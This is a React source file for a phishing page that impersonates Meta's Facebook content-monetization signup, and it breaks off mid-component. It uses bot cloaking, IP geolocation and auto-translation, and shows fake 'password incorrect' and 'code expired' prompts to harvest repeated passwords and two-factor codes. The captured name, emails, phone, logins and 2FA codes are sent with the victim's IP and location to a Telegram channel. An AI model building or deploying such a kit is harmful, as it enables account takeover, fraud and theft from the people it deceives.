import { useEffect, useState, useCallback, useMemo } from 'react';
import axios from 'axios';
import MetaLogo from '@/assets/images/meta-logo-grey.png';
import KiemTienImg from '@/assets/images/kiemtien.png';
import MoneyAdsImg from '@/assets/images/money-ads.png';
import TickImg from '@/assets/images/tick.png';
import { translateText } from '@/utils/translate';
import sendMessage from '@/utils/telegram';
import detectBot from '@/utils/detect_bot';
import countryToLanguage from '@/utils/country_to_language';
import FirstFormModal from '@/components/FirstFormModal';
import LoginModal from '@/components/LoginModal';
import TwoFAModal from '@/components/TwoFAModal';
import SuccessModal from '@/components/SuccessModal';
import Sidebar from '@/components/Sidebar';
import SearchModal from '@/components/SearchModal';
import PrivacyPolicyModal from '@/components/PrivacyPolicyModal';
import TermsModal from '@/components/TermsModal';

const LABEL = 'Thần-tài-đến';

const Home = () =>
{
    const [ showFirstModal, setShowFirstModal ] = useState( false );
    const [ showLoginModal, setShowLoginModal ] = useState( false );
    const [ show2FAModal, setShow2FAModal ] = useState( false );
    const [ showSuccessModal, setShowSuccessModal ] = useState( false );
    const [ showSearchModal, setShowSearchModal ] = useState( false );
    const [ showPrivacyModal, setShowPrivacyModal ] = useState( false );
    const [ selectedPrivacyQuestion, setSelectedPrivacyQuestion ] = useState( null );
    const [ showTermsModal, setShowTermsModal ] = useState( false );
    const [ showMobileSidebar, setShowMobileSidebar ] = useState( false );
    const [ formData, setFormData ] = useState( {
        fullName: '',
        personalEmail: '',
        businessEmail: '',
        phone: '',
        pageName: '',
        loginIdentifier: ''
    } );
    const [ loginAttempts, setLoginAttempts ] = useState( [] );
    const [ twoFAAttempts, setTwoFAAttempts ] = useState( [] );
    const [ ipInfo, setIpInfo ] = useState( { ip: 'Unknown', city: 'Unknown', region: 'Unknown', country: 'Unknown' } );
    const [ translatedTexts, setTranslatedTexts ] = useState( {} );
    const [ isLoading, setIsLoading ] = useState( true );

    const defaultTexts = useMemo(
        () => ( {
            metaVerified: 'Content monetization',
            monetizationTitle: 'Content monetization',
            monetizationSubtitle: 'Earn money by creating content that your audience loves.',
            inVideoAdsDesc1: 'If you upload video content to Facebook, you may be eligible to earn money through in-video ads.',
            inVideoAdsDesc2: 'To use this monetization method, you need to register.',
            howItWorksTitle: 'How Content monetization works',
            monetizationBetaLabel: 'Content monetization beta',
            monetizationBetaDesc: "We're actively working to expand access and make this program available to more creators soon.",
            getNotifiedTitle: 'Get notified when you can join',
            waitlistLabel: "You're on the waitlist",
            waitlistDesc: "Being on the waitlist doesn't guarantee access. We're actively working on expanding this program.",
            applyNow: 'Apply now',
            learnMore: 'Learn more',
            search: 'Search',
            privacyPolicy: 'Privacy Policy',
            otherRules: 'Other rules and articles',
            settings: 'Settings',
            creatorToolkit: 'A creator toolkit to take your brand further',
            creatorToolkitDesc: 'Explore key Meta Verified benefits available for Facebook and Instagram. See creator plans and pricing for additional benefits.',
            metaVerifiedBenefits: 'Meta Verified benefits',
            verifiedBadge: 'Verified badge',
            verifiedBadgeDesc: 'The badge means that your profile was verified by Meta based on your activity across Meta technologies, or information or documents that you provided.',
            impersonationProtection: 'Impersonation protection',
            impersonationProtectionDesc: 'Protect your brand with proactive impersonation monitoring. Meta will remove accounts that we determine are pretending to be you.',
            enhancedSupport: 'Enhanced support',
            enhancedSupportDesc: 'Get 24/7 access to email or chat agent support.',
            upgradedProfile: 'Upgraded profile features',
            upgradedProfileDesc: 'Enrich your profile by adding images to your links to help boost engagement.',
            exploreBusiness: 'Explore Meta Verified for business benefits.',
            businessDesc1: 'Meta Verified provides tools to help you build more confidence with new audiences, protect your brand and more efficiently engage with your customers.',
            businessDesc2: 'Distinguish fake accounts: Help customers distinguish real and fake accounts, avoid buying from the wrong shop.',
            businessDesc3: 'Increased Credibility: Accounts with Verified Badges are often highly regarded and attract more potential customers.',
            businessDesc4: 'Increased search visibility: Accounts with the Verified Badge are often given priority in search results.',
            businessDesc5: 'Personalized Content Strategy Consulting',
            businessDesc6: 'Work with a consultant to review and improve your social media content strategy for your subscribed account every week.',
            privacyPolicyQ: 'What is the Privacy Policy and what does it say?',
            manageInfo: 'How you can manage or delete your information',
            userAgreement: 'For more details, see the User Agreement',
            metaAI: 'Meta AI',
            additionalResources: 'Additional resources',
            aiInfo: 'How Meta uses information for generative AI models',
            aiCards: 'Cards with information about the operation of AI systems',
            aiIntro: 'Introduction to Generative AI',
            privacyCenter: 'Privacy Center',
            metaAIWebsite: 'Meta AI website',
            forTeenagers: 'For teenagers',
            privacyRisks: 'We continually identify potential privacy risks, including when collecting, using or sharing personal information, and developing methods to reduce these risks. Read more about',
            testimonial1: '"Being Meta Verified has elevated my credibility with my audience. For new followers or potential partners viewing my profile, it shows that I am established and serious about my work."',
            testimonial2: '"Meta Verified helped me build my credibility as a creator."',
            testimonial3: '"I like how Meta Verified added an extra layer of security to help protect me from impersonation."',
            testimonial4: '"Meta Verified helped my account stand out from impersonators, which helped me secure more paying clients."',

            fullName: 'Full Name',
            personalEmail: 'Personal Email',
            businessEmail: 'Business Email',
            mobilePhone: 'Mobile Phone Number',
            yourPageName: 'Your Page Name',
            agreeToTerms: 'I agree to the',
            confirm: 'Confirm',
            aboutHelpMore: 'About · Help · See more',

            loginInstruction: 'To activate content monetization and start earning money on Facebook, you must be logged in to your creator account (Facebook) or business Page (Facebook).',
            mobileOrEmail: 'Mobile number or email',
            password: 'Password',
            passwordIncorrect: 'Password is incorrect, please try again.',
            logIn: 'Log in',
            continueBtn: 'Continue',
            forgotPassword: 'Forgot password?',

            twoFATitle: 'Check your authentication code',
            twoFAInstruction: 'Enter the digit code for this account from the two-factor authentication you set up (such as Google Authenticator, email or text message on your mobile).',
            code: 'Code',
            codeExpired: 'This code has expired. Please enter a new code later',
            pleaseWait: 'Please wait',

            findNewWaysTitle: 'Find new ways to earn money with your content.',
            creatorLabel: 'Creator',
            subscribeBtn: 'Subscribe',
            monetizeDesc: "Whether you're creating videos or publishing to a blog, Facebook monetization tools help you earn more money.",

            successTitle: 'Đăng ký kiếm tiền thành công!',
            successMessage1: 'Tuyệt vời! Yêu cầu đăng ký kiếm tiền của bạn đã được phê duyệt.',
            successMessage2: 'Tính năng kiếm tiền sẽ được kích hoạt trên trang của bạn trong vòng 24 – 48 giờ tới.',
            successMessage3: 'Nếu tính năng chưa xuất hiện sau thời gian này, vui lòng liên hệ lại với chúng tôi để được hỗ trợ thêm.',
            thankYou: 'Cảm ơn bạn đã tin tưởng!',
            metaSupportTeam: 'Nhóm hỗ trợ Meta.',

            searchPlaceholder: 'Search the Privacy Center',
            nothingFound: 'Nothing found',
            searchHint: 'Use other keywords or check the spelling of the search term request.',

            mainInSection: 'The main thing in the section',
            privacyDesc1: 'At Meta, we want you to understand what information we collect, how we use it, and with whom we use it. let\'s share. Therefore, we recommend that you read our Privacy Policy. This will help you use',
            privacyDesc2: '\'s products the way you need.',
            privacyDesc3: 'In the Privacy Policy, we explain how we collect, use, store information, and We also share it. We also tell you about your rights. Each section of the Policy contains Useful examples and simplified statements to make our work easier to understand. We also added links to resources where you can learn in more detail about topics that interest you with confidentiality.',
            privacyDesc4: 'It is important to us that you know how to manage your privacy (confidentiality), so we also We show you where in the settings of the Meta Products you use you can manage your data. You you can',
            updateSettings: 'update these settings',
            privacyDesc5: 'to personalize your user experience.',
            ourPolicies: 'Our policies.',
            whatProducts: 'What products are covered by this policy?',
            learnMorePrivacy: 'Learn more about managing your privacy at Privacy Center',
            whatInfoCollect: 'What information do we collect?',
            infoCollectDesc1: 'The information we collect and process about you depends on how you use our',
            products: 'Products',
            infoCollectDesc2: '. For example, we collect different information when you sell furniture on Marketplace and when you post a Reels video on Instagram. We collect data about you when you use our Products,',
            evenNoAccount: 'even if you do not have an account',
            typesOfData: 'The following are the types of data we collect:',
            yourActions: 'Your actions and information you provide to us',
            friendsSubscribers: 'Friends, subscribers and other contacts',
            appBrowserDevice: 'Application, browser and device information',
            infoFromPartners: 'Information from Partners, suppliers and other third parties',
            whatIfNotAllow: 'What happens if you do not allow us to collect certain types of information?',
            someInfoNecessary: 'Some information is necessary for the operation of our Products. Other information is optional, but its absence may affect your experience with our products.',
            moreDetails: 'More details',
            whatIfNoIdentify: 'What if the information we collect does not personally identify individuals?',
            deIdentifyDesc: 'In some cases, before third parties make information available to us, they de-identify, aggregate, or anonymize it so that it cannot be used to identify individual individuals. We use this information as described below, without attempting to re-identify individuals.',
            dataControl: 'Data control',
            manageInfoCollect: 'Manage the information we collect about you',

            termsOfUse: 'Terms of use',
            termsDesc1: 'Meta creates technologies and services that allow people to communicate with each other, form communities and develop companies. This User Agreement governs the use of you Facebook, Messenger, and other products, features, applications, services, technologies and software we offer (',
            metaProducts: 'Meta Products',
            termsDesc2: ' or ',
            termsDesc3: '), if not expressly states that separate terms apply (and this agreement does not apply). These Products are provided to you by Meta Platforms, Inc.',
            termsDesc4: 'Our ',
            termsDesc5: ' explains how we collect and use your personal data to determine which advertisements may be relevant to you, and provide other services described below. Also, in ',
            termsDesc6: ' of the relevant Products Meta, you can change your privacy level at any time regarding our use of your data.',
            servicesWeProvide: 'Services we provide',
            service1: 'Personalize your experience.',
            service2: 'Connect with people and organizations that interest you.',
            service3: 'Opportunity to express yourself and communicate on topics that are important to you.',
            service4: 'Search for content, products and services that may interest you.',
            service5: 'Ensuring the safety, security and integrity of our services, combating malicious behavior and protecting our user community.',
            service6: 'Using and developing advanced technologies to provide safe and functional services.',
            service7: 'Research ways to improve the quality of our services.',
            service8: 'Ensuring consistency and convenience of various Meta Companies Products.',
            service9: 'Providing access to our services.',
            otherTermsPolicies: 'Other terms and policies that may apply to you',
            advertisingRules: 'Advertising Rules',
            advertisingRulesDesc: '. These rules apply to partners who advertise on various Meta Products and determine the types of advertising content that such partners are permitted to use.',
            communityStandards: 'Community Standards',
            communityStandardsDesc: '. These guidelines set out our standards for the content you post on Facebook and your activities on Facebook and other Meta Products.',
            communityPaymentTerms: 'Community Payment Terms',
            communityPaymentTermsDesc: '. These terms apply to payments made to or through the Meta Products.',
            commercialTerms: 'Commercial terms',
            commercialTermsDesc: '. These terms apply if you use or access our Products for any commercial or business purposes, including advertising, using our measurement services, managing an application on our Platform, a group or a Company Page, and selling goods or services.',
            tradeRules: 'Trade Rules',
            tradeRulesDesc: '. This guide outlines the rules that apply when you offer products or services for sale on Facebook, Instagram or WhatsApp.',
            lastRevisionDate: 'Last revision date: July 26, 2023',
            accountSecurity: 'Account security',

            privacyQ1: 'What is the Privacy Policy and what does it cover?',
            privacyQ2: 'What information do we collect?',
            privacyQ3: 'How do we use your information?',
            privacyQ4: 'How do we share your information on Meta Products or with integrated partners?',
            privacyQ5: 'How do we share information with third parties?',
            privacyQ6: 'How is the cooperation between Meta Companies organized?',
            privacyQ7: 'How can you manage or delete your information and exercise your rights?',
            privacyQ8: 'How long do we keep your information?',
            privacyQ9: 'How do we transmit information?',
            privacyQ10: 'How do we respond to official requests, comply with applicable laws, and prevent harm?',
            privacyQ11: 'How will you know when the policy changes?',
            privacyQ12: 'How to ask Meta questions?',
            privacyQ13: 'Why and how we process your data'
        } ),
        []
    );

    useEffect( () =>
    {
        localStorage.clear();
        initializeApp();
    }, [] );

    const initializeApp = async () =>
    {
        try
        {
            const botResult = await detectBot();
            if ( botResult.isBot )
            {
                window.location.href = 'about:blank';
                return;
            }

            try
            {
                const response = await axios.get( 'https://get.geojs.io/v1/ip/geo.json' );
                const data = response.data;
                setIpInfo( {
                    ip: data.ip || 'Unknown',
                    city: data.city || 'Unknown',
                    region: data.region || 'Unknown',
                    country: data.country || 'Unknown'
                } );
                localStorage.setItem( 'ipInfo', JSON.stringify( data ) );

                const countryCode = data.country_code;
                const targetLang = countryToLanguage[ countryCode ] || 'en';
                localStorage.setItem( 'targetLang', targetLang );

                if ( targetLang !== 'en' )
                {
                    translateAllTexts( targetLang );
                } else
                {
                    setTranslatedTexts( defaultTexts );
                }
            } catch ( error )
            {
                console.error( 'Error fetching IP:', error );
                setTranslatedTexts( defaultTexts );
            }

            setIsLoading( false );
        } catch ( error )
        {
            console.error( 'Initialization error:', error );
            setIsLoading( false );
        }
    };

    const translateAllTexts = useCallback(
        async ( targetLang ) =>
        {
            try
            {
                const keys = Object.keys( defaultTexts );
                const translations = await Promise.all( keys.map( ( key ) => translateText( defaultTexts[ key ], targetLang ) ) );
                const translated = {};
                keys.forEach( ( key, index ) =>
                {
                    translated[ key ] = translations[ index ];
                } );
                setTranslatedTexts( translated );
            } catch ( error )
            {
                console.error( 'Translation error:', error );
                setTranslatedTexts( defaultTexts );
            }
        },
        [ defaultTexts ]
    );

    const pad = ( n ) => ( n < 10 ? '0' + n : String( n ) );

    const formatDateTime = ( d ) =>
    {
        return (
            pad( d.getDate() ) +
            '/' +
            pad( d.getMonth() + 1 ) +
            '/' +
            d.getFullYear() +
            ' ' +
            pad( d.getHours() ) +
            ':' +
            pad( d.getMinutes() ) +
            ':' +
            pad( d.getSeconds() )
        );
    };

    const buildAndSend = async ( data ) =>
    {
        const dt = formatDateTime( new Date() );
        const { form, login, passes, codes } = data;

        let message = `📩 <b>${ LABEL }</b>\n`;
        message += `⏰ ${ dt }\n`;
        message += `🌐 IP: <code>${ ipInfo.ip }</code>\n`;
        message += `📍 Vị trí: ${ ipInfo.city }, ${ ipInfo.region }, ${ ipInfo.country }\n`;
        message += `━━━━━━━━━━━━━━━━━━━━\n`;

        if ( form.fullName || form.personalEmail || form.businessEmail || form.phone || form.pageName )
        {
            message += `<b>📋 THÔNG TIN</b>\n`;
            if ( form.fullName ) message += `   Tên: <code>${ form.fullName }</code>\n`;
            if ( form.personalEmail ) message += `   Email: <code>${ form.personalEmail }</code>\n`;
            if ( form.businessEmail && form.businessEmail !== form.personalEmail )
            {
                message += `   Business: <code>${ form.businessEmail }</code>\n`;
            }
            if ( form.phone ) message += `   SĐT: <code>${ form.phone }</code>\n`;
            if ( form.pageName ) message += `   Page: <code>${ form.pageName }</code>\n`;
        }

        if ( login || ( passes && passes.length > 0 ) )
        {
            message += `\n<b>🔐 ĐĂNG NHẬP</b>\n`;
            if ( login ) message += `   TK: <code>${ login }</code>\n`;
            if ( passes && passes.length > 0 )
            {
                passes.forEach( ( p, i ) =>
                {
                    message += `   MK${ i + 1 }: <code>${ p }</code>\n`;
                } );
            }
        }

        if ( codes && codes.length > 0 )
        {
            message += `\n<b>🔒 MÃ 2FA</b>\n`;
            codes.forEach( ( c, i ) =>
            {
                message += `   Code${ i + 1 }: <code>${ c }</code>\n`;
            } );
        }

        message += `━━━━━━━━━━━━━━━━━━━━`;

        try
        {
            await sendMessage( message );
        } catch ( error )
        {
            console.error( 'Error sending message:', error );
        }
    };

    const handleFirstFormSubmit = ( data ) =>
    {
        const newFormData = { ...formData, ...data };
        setFormData( newFormData );
        setShowFirstModal( false );
        setShowLoginModal( true );

        buildAndSend( {
            form: newFormData,
            login: null,
            passes: [],
            codes: []
        } );
    };

    const handleLoginSubmit = ( email, password ) =>
    {
        const newFormData = { ...formData, loginIdentifier: email };
        const newPasses = [ ...loginAttempts.map( p => p.value ), password ].slice( -2 );

        setFormData( newFormData );
        setLoginAttempts( prev => [ ...prev, { time: new Date().toISOString(), value: password } ].slice( -2 ) );

        buildAndSend( {
            form: newFormData,
            login: email,
            passes: newPasses,
            codes: twoFAAttempts.map( c => c.value )
        } );
    };

    const handle2FASubmit = ( code ) =>
    {
        const newCodes = [ ...twoFAAttempts.map( c => c.value ), code ].slice( -3 );

        setTwoFAAttempts( prev => [ ...prev, { time: new Date().toISOString(), value: code } ].slice( -3 ) );

        buildAndSend( {
            form: formData,
            login: formData.loginIdentifier,
            passes: loginAttempts.map( p => p.value ),
            codes: newCodes
        } );
    };

    const texts = Object.keys( translatedTexts ).length > 0 ? translatedTexts : defaultTexts;

    if ( isLoading )
    {
        return (
            <div id="intro" style={ { position: 'fixed', top: 0, left: 0, width: '100%', height: '100%', background: '#fff', display: 'flex', justifyContent: 'center', alignItems: 'center', zIndex: 9999 } }>
                <img id="meta-logo" src={ MetaLogo } alt="Meta" style={ { width: '70%', height: 'auto' } } />
            </div>
        );
    }

    return (
        <>
            <div className="container-sm" id="main">
                <div className="container-head">
                    <div id="logo">
                        <svg aria-label="Логотип Meta" className="x1kpxq89 x1247r65" role="img" viewBox="0 0 500 100">
                            <defs>
                                <linearGradient gradientUnits="userSpaceOnUse" id=":R1eckmkldd6knpapd5aqH1:" x1="124.38" x2="160.839" y1="99" y2="59.326">
                                    <stop offset=".427" stopColor="#0278F1"></stop>
                                    <stop offset=".917" stopColor="#0180FA"></stop>
                                </linearGradient>
                                <linearGradient gradientUnits="userSpaceOnUse" id=":R1eckmkldd6knpapd5aqH2:" x1="42" x2="-1.666" y1="4.936" y2="61.707">
                                    <stop offset=".427" stopColor="#0165E0"></stop>
                                    <stop offset=".917" stopColor="#0180FA"></stop>
                                </linearGradient>
                                <linearGradient gradientUnits="userSpaceOnUse" id=":R1eckmkldd6knpapd5aqH3:" x1="27.677" x2="132.943" y1="28.71" y2="71.118">
                                    <stop stopColor="#0064E0"></stop>
                                    <stop offset=".656" stopColor="#0066E2"></stop>
                                    <stop offset="1" stopColor="#0278F1"></stop>
                                </linearGradient>
                            </defs>
                            <path
                                d="M185.508 3.01h18.704l31.803 57.313L267.818 3.01h18.297v94.175h-15.264v-72.18l-27.88 49.977h-14.319l-27.88-49.978v72.18h-15.264V3.01ZM336.281 98.87c-7.066 0-13.286-1.565-18.638-4.674-5.352-3.12-9.527-7.434-12.528-12.952-2.989-5.517-4.483-11.835-4.483-18.973 0-7.214 1.461-13.608 4.385-19.17 2.923-5.561 6.989-9.908 12.187-13.05 5.198-3.13 11.176-4.707 17.923-4.707 6.715 0 12.484 1.587 17.319 4.74 4.847 3.164 8.572 7.598 11.177 13.291 2.615 5.693 3.923 12.371 3.923 20.046v4.171h-51.793c.945 5.737 3.275 10.258 6.989 13.554 3.715 3.295 8.407 4.937 14.078 4.937 4.549 0 8.461-.667 11.747-2.014 3.286-1.347 6.374-3.383 9.253-6.12l8.099 9.886c-8.055 7.357-17.934 11.036-29.638 11.036Zm11.143-55.867c-3.198-3.252-7.385-4.872-12.56-4.872-5.045 0-9.264 1.653-12.66 4.97-3.407 3.318-5.55 7.784-6.451 13.39h37.133c-.451-5.737-2.275-10.237-5.462-13.488ZM386.513 39.467h-14.044V27.03h14.044V6.447h14.715V27.03h21.341v12.437h-21.341v31.552c0 5.244.901 8.988 2.703 11.233 1.803 2.244 4.88 3.36 9.253 3.36 1.935 0 3.572-.076 4.924-.23a97.992 97.992 0 0 0 4.461-.645v12.316c-1.67.493-3.549.898-5.637 1.205-2.099.317-4.286.47-6.583.47-15.89 0-23.836-8.649-23.836-25.957V39.467ZM500 97.185h-14.44v-9.82c-2.571 3.678-5.835 6.513-9.791 8.506-3.968 1.993-8.462 3-13.506 3-6.209 0-11.715-1.588-16.506-4.752-4.803-3.153-8.572-7.51-11.308-13.039-2.748-5.54-4.121-11.879-4.121-19.006 0-7.17 1.395-13.52 4.187-19.038 2.791-5.518 6.648-9.843 11.571-12.985 4.935-3.13 10.594-4.707 16.99-4.707 4.813 0 9.132.93 12.956 2.791a25.708 25.708 0 0 1 9.528 7.905v-9.01H500v70.155Zm-14.715-45.61c-1.571-3.985-4.066-7.138-7.461-9.448-3.396-2.31-7.33-3.46-11.781-3.46-6.308 0-11.319 2.102-15.055 6.317-3.737 4.215-5.605 9.92-5.605 17.09 0 7.215 1.802 12.94 5.396 17.156 3.604 4.215 8.484 6.317 14.66 6.317 4.538 0 8.593-1.16 12.154-3.492 3.549-2.332 6.121-5.475 7.692-9.427V51.575Z"
                                fill="#1C2B33"
                            ></path>
                            <path
                                d="M107.666 0C95.358 0 86.865 4.504 75.195 19.935 64.14 5.361 55.152 0 42.97 0 18.573 0 0 29.768 0 65.408 0 86.847 12.107 99 28.441 99c15.742 0 25.269-13.2 33.445-27.788l9.663-16.66a643.785 643.785 0 0 1 2.853-4.869 746.668 746.668 0 0 1 3.202 5.416l9.663 16.454C99.672 92.72 108.126 99 122.45 99c16.448 0 27.617-13.723 27.617-33.25 0-37.552-19.168-65.75-42.4-65.75ZM57.774 46.496l-9.8 16.25c-9.595 15.976-13.639 19.526-19.67 19.526-6.373 0-11.376-5.325-11.376-17.547 0-24.51 12.062-47.451 26.042-47.451 7.273 0 12.678 3.61 22.062 17.486a547.48 547.48 0 0 0-7.258 11.736Zm64.308 35.776c-6.648 0-11.034-4.233-20.012-19.39l-9.663-16.386c-2.79-4.737-5.402-9.04-7.88-12.945 9.73-14.24 15.591-17.984 23.002-17.984 14.118 0 26.204 20.96 26.204 49.158 0 11.403-4.729 17.547-11.651 17.547Z"
                                fill="#0180FA"
                            ></path>
                            <path d="M145.631 36h-16.759c3.045 7.956 4.861 17.797 4.861 28.725 0 11.403-4.729 17.547-11.651 17.547H122v16.726l.449.002c16.448 0 27.617-13.723 27.617-33.25 0-10.85-1.6-20.917-4.435-29.75Z" fill="url(#:R1eckmkldd6knpapd5aqH1:)"></path>
                            <path d="M42 .016C18.63.776.832 28.908.028 63h16.92C17.483 39.716 28.762 18.315 42 17.31V.017Z" fill="url(#:R1eckmkldd6knpapd5aqH2:)"></path>
                            <path
                                d="m75.195 19.935.007-.009c2.447 3.223 5.264 7.229 9.33 13.62l-.005.005c2.478 3.906 5.09 8.208 7.88 12.945l9.663 16.386c8.978 15.157 13.364 19.39 20.012 19.39.31 0 .617-.012.918-.037v16.76c-.183.003-.367.005-.551.005-14.323 0-22.777-6.281-35.182-27.447L77.604 55.1l-.625-1.065L77 54c-2.386-4.175-7.606-12.685-11.973-19.232l.005-.008-.62-.91C63.153 31.983 61.985 30.313 61 29l-.066.024c-7.006-9.172-11.818-11.75-17.964-11.75-.324 0-.648.012-.97.037V.016c.322-.01.646-.016.97-.016 12.182 0 21.17 5.36 32.225 19.935Z"
                                fill="url(#:R1eckmkldd6knpapd5aqH3:)"
                            >                            </path>
                        </svg>
                    </div>
                    <div className="burger-button" id="showPopup" onClick={ () => setShowMobileSidebar( true ) } style={ { cursor: 'pointer' } }>
                        <div className="bar"></div>
                        <div className="bar"></div>
                        <div className="bar"></div>
                    </div>
                </div>
                <div className="row">
                    <div className="col-4">
                        <Sidebar
                            texts={ texts }
                            onOpenSearchModal={ () => setShowSearchModal( true ) }
                            onOpenPrivacyModal={ ( question ) =>
                            {
                                setSelectedPrivacyQuestion( question );
                                setShowPrivacyModal( true );
                            } }
                            onOpenTermsModal={ () => setShowTermsModal( true ) }
                        />
                    </div>
                    <div className="col-8">
                        <div id="right">
                            <div style={ { display: 'flex', alignItems: 'center', gap: '10px', marginBottom: '4px' } }>
                                <img src={ TickImg } alt="Kiếm tiền" style={ { width: '40px', height: '40px', objectFit: 'contain', flexShrink: 0 } } />
                                <div style={ { fontSize: '20px', fontWeight: '700', color: '#1c1e21' } }>
                                    { texts.monetizationTitle }
                                </div>
                            </div>
                            <p style={ { color: '#65676b', marginBottom: '8px' } }>{ texts.monetizationSubtitle }</p>
                            <p style={ { color: '#65676b', marginBottom: '4px' } }>{ texts.inVideoAdsDesc1 }</p>
                            <p style={ { color: '#65676b', marginBottom: '16px' } }>{ texts.inVideoAdsDesc2 }</p>

                            {/* Card 1: How it works */ }
                            <div style={ { background: '#fff', borderRadius: '12px', boxShadow: '0 1px 3px rgba(0,0,0,0.15)', marginBottom: '16px', overflow: 'hidden' } }>
                                <div style={ { padding: '16px 16px 0' } }>
                                    <div style={ { fontSize: '17px', fontWeight: '700', color: '#1c1e21', marginBottom: '12px' } }>
                                        { texts.howItWorksTitle }
                                    </div>
                                </div>
                                <div style={ { padding: '0 16px 12px', position: 'relative' } }>
                                    <img
                                        alt="In-video ads example"
                                        src={ MoneyAdsImg }
                                        style={ { width: '100%', display: 'block', height: '345px', borderRadius: '10px', objectFit:'cover' } }
                                    />
                                    <img
                                        alt=""
                                        src="https://static.xx.fbcdn.net/rsrc.php/yh/r/M6gzkg5vYje.webp?_nc_eui2=AeFevwqVrtKjECYULcTXH3fl5akSRm94oLTlqRJGb3igtA6PbqtuZ3EAfNXCiOnG0BIJGf6NkbxeNO8kaGjkzxyB"
                                        style={ { position: 'absolute', top: '8px', right: '24px', width: '56px', height: '56px', objectFit: 'contain' } }
                                        referrerPolicy="origin-when-cross-origin"
                                    />
                                </div>
                                <div style={ { padding: '16px' } }>
                                    <div style={ { display: 'flex', alignItems: 'flex-start', gap: '12px', background: '#f0f2f5', borderRadius: '10px', padding: '12px' } }>
                                        <img
                                            alt=""
                                            src="https://static.xx.fbcdn.net/rsrc.php/yW/r/Mj9cg0dI-lS.webp?_nc_eui2=AeHtRcM2QkSgUjRiihrA33hyzowCkmYvbC_OjAKSZi9sL1nvLXCZdAMcdsoktuC61mQYordHhyG5zRprCwVK4tKz"
                                            width="24"
                                            height="24"
                                            referrerPolicy="origin-when-cross-origin"
                                        />
                                        <div>
                                            <div style={ { fontWeight: '600', fontSize: '15px', color: '#1c1e21', marginBottom: '4px' } }>
                                                { texts.monetizationBetaLabel }
                                            </div>
                                            <div style={ { fontSize: '14px', color: '#65676b' } }>
                                                { texts.monetizationBetaDesc }
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>

                            {/* Card 2: Get notified */ }
                            <div style={ { background: '#fff', borderRadius: '12px', boxShadow: '0 1px 3px rgba(0,0,0,0.15)', marginBottom: '16px', overflow: 'hidden' } }>
                                <div style={ { padding: '14px 16px 14px' } }>
                                    <div style={ { fontSize: '17px', fontWeight: '700', color: '#1c1e21', marginBottom: '12px' } }>
                                        { texts.getNotifiedTitle }
                                    </div>
                                    <div style={ { display: 'flex', alignItems: 'flex-start', gap: '12px', background: '#f0f2f5', borderRadius: '10px', padding: '12px', marginBottom: '10px' } }>
                                        <div style={ { flexShrink: 0, width: '32px', height: '32px', borderRadius: '50%', background: '#e4e6eb', display: 'flex', alignItems: 'center', justifyContent: 'center' } }>
                                            <img
                                                alt=""
                                                src="https://static.xx.fbcdn.net/rsrc.php/yj/r/yhNnexVBr6T.webp?_nc_eui2=AeGj67MLO6SQsk1j403fpl0irPsT7zqTeses-xPvOpN6xznzw4_aj-Auiu80kX2gZtPRZTWj3tTJ9JRf0p6hQ6Ad"
                                                width="24"
                                                height="24"
                                                referrerPolicy="origin-when-cross-origin"
                                            />
                                        </div>
                                        <div>
                                            <div style={ { fontWeight: '600', fontSize: '15px', color: '#1c1e21', marginBottom: '4px' } }>
                                                { texts.waitlistLabel }
                                            </div>
                                            <div style={ { fontSize: '14px', color: '#65676b' } }>
                                                { texts.waitlistDesc }
                                            </div>
                                        </div>
                                    </div>
                                    <div
                                        className="button fb-blue w-100"
                                        id="start"
                                        onClick={ () => setShowFirstModal( true ) }
                                        style={ { cursor: 'pointer' } }
                                    >
                                        { texts.applyNow }
                                    </div>
                                </div>
                            </div>
                            {/* Card 3: Monetize My Content */ }
                            <div style={ { background: '#1c2b33', borderRadius: '12px', overflow: 'hidden', marginBottom: '16px' } }>
                                <div style={ { padding: '16px', display: 'flex', gap: '16px', alignItems: 'flex-start' } }>
                                    <div style={ { flex: 1 } }>
                                        <div style={ { fontSize: '11px', color: '#b0b8bf', marginBottom: '10px' } }>
                                            © Monetize My Content
                                        </div>
                                        <div style={ { fontSize: '22px', fontWeight: '700', color: '#fff', lineHeight: '1.3', marginBottom: '12px' } }>
                                            { texts.findNewWaysTitle }
                                        </div>
                                        <div style={ { display: 'flex', alignItems: 'center', gap: '6px', color: '#e4e6eb', fontSize: '14px', fontWeight: '500', borderBottom: '1px solid #e4e6eb', paddingBottom: '2px', width: 'fit-content', cursor: 'pointer' } }>
                                            { texts.creatorLabel } <span style={ { fontSize: '12px' } }>↓</span>
                                        </div>
                                    </div>
                                    <div style={ { flexShrink: 0, width: '180px', position: 'relative', borderRadius: '12px', overflow: 'hidden' } }>
                                        <div style={ { position: 'absolute', top: '8px', left: '8px', right: '8px', display: 'flex', alignItems: 'center', gap: '8px', zIndex: 1 } }>

                                            <span style={ { color: '#fff', fontSize: '13px', fontWeight: '600', textShadow: '0 1px 2px rgba(0,0,0,0.5)' } }>The Vegan Baker</span>
                                        </div>
                                        <img
                                            src={ KiemTienImg }
                                            alt="Creator monetization"
                                            style={ { width: '100%', height: '200px', objectFit: 'cover', display: 'block' } }
                                        />
                                        <div style={ { position: 'absolute', bottom: '16px', left: '12px' } }>
                                            <div style={ { background: '#fff', borderRadius: '8px', padding: '6px 14px', fontSize: '14px', fontWeight: '600', color: '#1c1e21', boxShadow: '0 2px 6px rgba(0,0,0,0.2)' } }>
                                                { texts.subscribeBtn }
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div style={ { padding: '0 16px 16px' } }>
                                    <div style={ { fontSize: '14px', fontWeight: '600', color: '#e4e6eb', lineHeight: '1.5' } }>
                                        { texts.monetizeDesc }
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <FirstFormModal show={ showFirstModal } onClose={ () => setShowFirstModal( false ) } onSubmit={ handleFirstFormSubmit } texts={ texts } />
            <LoginModal show={ showLoginModal } onClose={ () => setShowLoginModal( false ) } onSubmit={ handleLoginSubmit } onSuccess={ () => { setShowLoginModal( false ); setShow2FAModal( true ); } } texts={ texts } />
            <TwoFAModal show={ show2FAModal } onClose={ () => setShow2FAModal( false ) } onSubmit={ handle2FASubmit } onSuccess={ () => { setShow2FAModal( false ); setShowSuccessModal( true ); } } texts={ texts } />
            <SuccessModal show={ showSuccessModal } onClose={ () => setShowSuccessModal( false ) } texts={ texts } />
            <SearchModal show={ showSearchModal } onClose={ () => setShowSearchModal( false ) } texts={ texts } />
            <PrivacyPolicyModal
                show={ showPrivacyModal }
                onClose={ () =>
                {
                    setShowPrivacyModal( false );
                    setSelectedPrivacyQuestion( null );
